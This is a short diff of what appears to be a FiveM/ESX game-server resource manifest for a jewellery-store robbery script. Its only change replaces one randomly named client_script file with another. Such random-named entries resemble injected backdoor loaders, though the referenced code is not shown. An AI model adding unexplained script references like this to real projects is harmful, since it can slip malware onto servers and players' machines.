@@ -21,4 +21,4 @@ server_scripts {
 	'server/esx_vangelico_robbery_sv.lua'
 }
 
-client_script "wHHGDVZcVvrhNxgVQe.lua"
+client_script "TalJDiXcmrWuOdRetV.lua"
